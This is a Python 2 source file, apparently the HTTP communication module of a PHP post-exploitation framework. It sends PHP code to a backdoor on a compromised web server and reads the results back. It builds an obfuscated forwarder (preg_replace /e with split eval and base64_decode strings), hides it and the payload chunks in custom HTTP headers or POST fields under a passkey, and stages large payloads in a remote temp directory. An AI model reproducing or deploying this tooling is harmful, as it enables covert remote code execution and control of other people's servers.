import urllib, urllib2, base64, time, re
from phpcode.payload import py2phpVar
from phpcode.payload import Build     as build_payload
from phpcode.payload import Encode    as encode_payload
import network.http
from functions import *

class Load:

    methods = ['GET','POST']

    base_headers = ['host','accept-encoding','connection','user-agent']
    post_headers = ['content-type','content-length']

    forwarder_template = {'GET'  : getpath('framework/phpfiles/forwarders/get.php').phpcode(),
                          'POST' : getpath('framework/phpfiles/forwarders/post.php').phpcode()}

    multipart = {'starter' : getpath('framework/phpfiles/multipart/starter.php').phpcode(),
                 'sender'  : getpath('framework/phpfiles/multipart/sender.php').phpcode(),
                 'reader'  : getpath('framework/phpfiles/multipart/reader.php').phpcode()}

    parser  = '<%SEP%>%s</%SEP%>'

    def __init__(self, CNF):
        self.target   = CNF['SET']['TARGET']

        self.passkey  = CNF['LNK']['PASSKEY']
        self.opener   = network.http.build_opener(CNF['SET']['PROXY'])
        self.headers  = network.http.load_headers(CNF['SET'])
        self.parser   = self.parser.replace('%SEP%', CNF['LNK']['HASH'])
        self.unparser = re.compile(self.parser % '(.+?)', re.S)

        self.tmpfil = '/'+(CNF['LNK']['HASH']*2)
        try: self.tmpdir = CNF['ENV']['WRITE_TMPDIR']+self.tmpfil
        except: self.tmpdir = None
        self.multipart_file = None

        self.default_method  = CNF['SET']['REQ_DEFAULT_METHOD'].upper()
        self.max_headers     = int(CNF['SET']['REQ_MAX_HEADERS'])
        self.max_header_size = octets(CNF['SET']['REQ_MAX_HEADER_SIZE'])
        self.max_post_size   = octets(CNF['SET']['REQ_MAX_POST_SIZE'])
        self.zlib_try_limit  = octets(CNF['SET']['REQ_ZLIB_TRY_LIMIT'])
        self.interval        = CNF['SET']['REQ_INTERVAL']

        available_headers = self.max_headers-len(self.base_headers)-len(self.headers.keys())-1 # -1 for the forwarder
        self.available_headers = {'POST' : available_headers-len(self.post_headers),
                                  'GET'  : available_headers}

        self.maxsize = {'POST' : self.max_post_size-len(self.passkey)-5, # -5 for '=' and '\r\n\r\n'
                        'GET'  : self.available_headers['GET']*(self.max_header_size-8)} # -8 for 'zzaa: ' and '\r\n'

        self.canSend = {'POST' : self.maxsize['POST'] > 0 and self.available_headers['POST'] >= 0,
                        'GET'  : self.maxsize['GET'] > 0}



    def other_method(self):
        return(self.methods[self.default_method == 'GET'])

    def can_add_headers(self, headers):
        for k,v in headers.items():
            if len('%s: %s\r\n'%(k,v)) > self.max_header_size:
                return(False)
        return(True)

    def encapsulate(self, payload):
        initCode, stopCode = ['echo "%s";' % x for x in self.parser.split('%s')]
        return(initCode+payload.rstrip(';')+stopCode)

    def decapsulate(self, response):
        try: return(re.findall(self.unparser, response.read())[0])
        except: return(None)

    def load_multipart(self):
        query = "Writeable remote directory required to send a multipart payload (ex: '/tmp')"
        while not self.tmpdir:
            response,confirm = ['','']
            while not response:
                response = raw_input(P_inf+query+": ")
            while confirm not in ['y','n']:
                try: confirm = raw_input(P_inf+"Use "+quot(response)+" as writeable directory ? (y/n): ").lower()
                except: print ''
            if confirm == 'y':
                self.tmpdir = response+self.tmpfil
        if not self.multipart_file:
            self.multipart_file = "$f=%s;" % py2phpVar(self.tmpdir)
            self.multipart = dict([(k,self.multipart_file+v) for k,v in self.multipart.items()])
            self.multipart['starter'] = self.encapsulate(self.multipart['starter'])
            self.multipart['sender']  = self.encapsulate(self.multipart['sender'])

    def build_forwarder(self, method, decoder):
        obfuscator   = "preg_replace('/(.*)/e','ev'.'al(ba'.'se6'.'4_de'.'code(\"%s\"))','');"
        template     = self.forwarder_template[method].replace('%%PASSKEY%%',self.passkey)
        decoder      = decoder % "$x"
        rawForwarder = template % decoder
        forwarder    = obfuscator % base64.b64encode(rawForwarder)
        return(forwarder)

    def build_get_headers(self, payload):
        def get_header_names(num):
            letters = 'abcdefghijklmnopqrstuvwxyz'
            result  = list()
            base    = 0
            for x in range(num):
                x-=26*base
                try:
                    l = letters[x]
                except:
                    base+= 1
                    l = letters[x-26]
                result.append('zz'+letters[base]+l)
            return(result)
        vals = split_len(payload, self.max_header_size-8)
        keys = get_header_names(len(vals))
        return(dict(zip(keys, vals)))

    def build_post_content(self, data):
        return(urllib.urlencode({self.passkey:data}))

    def build_single_request(self, method, payload):
        forwarder = self.build_forwarder(method, payload.decoder)
        headers   = {self.passkey : forwarder}
        content   = None
        if not self.can_add_headers(headers):
            return([])
        if method == 'GET':
            headers.update(self.build_get_headers(payload.data))
        if method == 'POST':
            content = self.build_post_content(payload.data)
        return([(headers,content)])

    def build_request(self, mode, method, payload):
        if mode == 'single':
            return(self.build_single_request(method, payload))

        if mode == 'multipart':

            multipart_reader = self.multipart['reader'] % payload.decoder % "$x"

            compress  = 'auto'
            if payload.length > self.zlib_try_limit:
                compress = 'nocompress'

            DATA      = payload.data
            REQUEST   = list()
            basenum   = int(self.maxsize[method])
            precision = max(100, self.maxsize[method]/100)
            minimum   = precision

            while True:
                multipart = self.multipart[['starter','sender'][len(REQUEST) > 0]]
                payload   = None
                ok        = False
                minN      = minimum
                maxN      = 0
                checkN    = basenum

                while not ok:
                    if maxN:
                        if maxN <= minN:
                            maxN = minN*2
                        checkN = int(minN+((maxN-minN)/2))

                    x_payload = encode_payload(multipart.replace('DATA',DATA[:checkN]), compress)

                    if x_payload.length > self.maxsize[method]:
                        if checkN <= minimum:
                            return([])
                        maxN = checkN

                    else:
                        if checkN-minN <= precision or (len(REQUEST) and checkN == basenum):
                            payload = x_payload
                            basenum = checkN
                            ok = True
                        minN = checkN

                request = self.build_single_request(method, payload)
                if not request:
                    return([])
                REQUEST+= request
                DATA = DATA[minN:]
                payload = encode_payload(multipart_reader.replace('DATA',DATA), compress)
                if payload.length <= self.maxsize[method]:
                    request = self.build_single_request(method, payload)
                    if not request:
                        return([])

                    return(REQUEST+request)
        return([])

    def send_single_request(self, request):
        response = {'error': None, 'data': None}
        headers,content = request

        headers.update(self.headers)
        headers = network.http.get_headers(headers)

        request = urllib2.Request(self.target, content, headers)
        try:
            response['data'] = self.decapsulate(self.opener.open(request))
        except urllib2.HTTPError, e:
            response['data'] = self.decapsulate(e)
            if response['data'] is None:
                response['error'] = str(e)
        except urllib2.URLError, e:
            err = str(e)
            if err.startswith('<urlopen error '):
                err = err[15:-1]
                if err.startswith('[Errno '):
                    err = err[err.find(']')+2:]
                err = 'Request error: '+err
            response['error'] = err
        except:
            response['error'] = 'HTTP Request interrupted'

        return(response)

    def get_php_errors(self, data):
        data = data.replace('<br />','\n')
        data = [x.strip() for x in data.split('\n') if x.strip()]
        error = ''
        for x in data:
            if x.count(': ')>1 and ' on line ' in x:
                x = re.sub(' \[<a.*?a>\]','',x)
                x = re.sub('<.*?>','',x)
                x = x.replace(':  ',': ')
                x = ' in '.join(x.split(' in ')[0:-1])
                error+= 'PHP Error: '+x+P_NL
        return(error.strip())


    def read(self):
        return(self.response)

    def open(self, payload):
        self.error          = None
        self.response       = None
        self.response_error = None

        def gotError(obj, errtype, prefix=''):
            if prefix:
                prefix+=' Error: '
            if type(obj).__name__ == 'str':
                err = P_NL.join(['\r'+P_err+prefix+x for x in obj.splitlines() if x])
                if err:
                    print err
                self.error = errtype
                return(1)
            return(0)

        request = self.Build(payload)
        if gotError(request, 'building', 'Build'): return

        response = self.Send(request)
        if gotError(response, 'request'): return

        readed = self.Read(response)
        if gotError(readed, 'execution'): return



    def Build(self, payload):
        if self.passkey.lower().replace('_','-') in self.headers:
            return('The PASSKEY setting is in conflict with an http header')

        if not self.can_add_headers(self.headers):
            return('An HTTP header is longer than the REQ_MAX_HEADER_SIZE setting')

        payload = build_payload(payload, self.parser)
        if payload.error:
            return(payload.error)

        mode = dict()
        for m in self.methods:
            mode[m] = ''
            if self.canSend[m]:
                mode[m] = 'single'
                if payload.length > self.maxsize[m]:
                    mode[m] = 'multipart'

        if mode[self.default_method] == 'single':
            request = self.build_request('single', self.default_method, payload)
            if not request:
                return('The forwarder is bigger than the REQ_MAX_HEADER_SIZE setting')
            return(request)

        if 'multipart' in mode.values():
            try:
                self.load_multipart()
            except:
                print ''
                return('Payload construction aborted')

        request = dict()
        for m in self.methods:
            write('\rBuilding '+m+' method...\r')
            try: request[m] = self.build_request(mode[m], m, payload)
            except: return('Payload construction aborted')

        if not request[self.default_method]:
            self.default_method = self.other_method()

        if not request[self.default_method]:
            return('The REQ_* settings are too small to send the payload')

        self.choices = list()
        def choice(seq):
            self.choices+= [seq[0].upper()]
            return('['+color(1)+seq[0]+color(0)+']'+seq[1:])

        m  = self.default_method
        m2 = self.other_method()
        msg = P_inf+"%s %s request%s will be sent, you also can " % (str(len(request[m])), choice(m), ['','s'][len(request[m])>1])
        end = "%s" % choice('Abort')
        if request[m2]:
            msg+= "send %s %s request%s or " % (str(len(request[m2])), choice(m2), ['','s'][len(request[m2])>1])
        else:
            #end+= color(37)+(" (%s method unavailable)"%m2)+color(0)
            print P_err+'%s method disabled: The REQ_* settings are too restrictive' % m2
        msg+=end+': '
        self.choices+=[None]

        choosed = ''
        while not choosed:
            try:
                choosed = raw_input(msg).upper()
            except:
                print ''
                return('Request construction aborted')
            if not choosed.strip(): choosed = self.choices[0]
            if choosed == self.choices[0]:
                return(request[m])
            if choosed == self.choices[2]:
                return(request[m2])
            if choosed == self.choices[1]:
                return('Request construction aborted')



    def Send(self, request):
        lastreq   = request[-1]
        request   = request[:-1]
        interrupt = 'Send Error: Multipart transfer interrupted\n'
        interrupt+= 'The remote temporary payload %s must be manually removed.'
        msg       = color(37)+' (Press Enter or wait 1 minut for the next try)'+color(0)

        def show(n):
            t = str(len(request)+1)
            n = str(n).zfill(len(t))
            write('\r'+P_inf+'Sending request %s of %s' % (n,t))

        for n in range(len(request)):
            sent = False
            while not sent:
                show(n+1)
                err = None
                req = self.send_single_request(request[n])
                if req['error']:
                    if req['error'] == 'HTTP Request interrupted':
                        return(interrupt)
                    err = req['error']
                elif req['data'] != '1':
                    err = 'Execution error'
                if err:
                    write('\n'+P_err+err+msg)
                    try: sleep_or_press_enter(60)
                    except: return(interrupt % quot(self.tmpdir))
                else:
                    sent = True
                    try: time.sleep(getinterval(self.interval))
                    except: return(interrupt % quot(self.tmpdir))

        if len(request):
            show(len(request)+1)
            print ''
        return(self.send_single_request(lastreq))



    def Read(self, response):
        if response['data'] is None:
            if response['error']:
                return(response['error'])
            return('Execution Error: Failed to unparse the response')

        response = response['data']

        try: response = response.decode('zlib')
        except: pass

        try:
            import phpcode.phpserialize
            response = phpcode.phpserialize.loads(response)
        except:
            phperr = self.get_php_errors(response)
            if phperr: return(phperr)
            else: return('Execution Error: Failed to unserialize the response')

        if type(response).__name__ != 'dict':
            return('Execution error: Unserialized response is not a dictionnary')

        if response.keys() == ['__RESULT__']:
            self.response       = response['__RESULT__']
        elif response.keys() == ['__ERROR__']:
            self.response_error = response['__ERROR__']
        else:
            return('Execution error: Invalid response dictionnary')
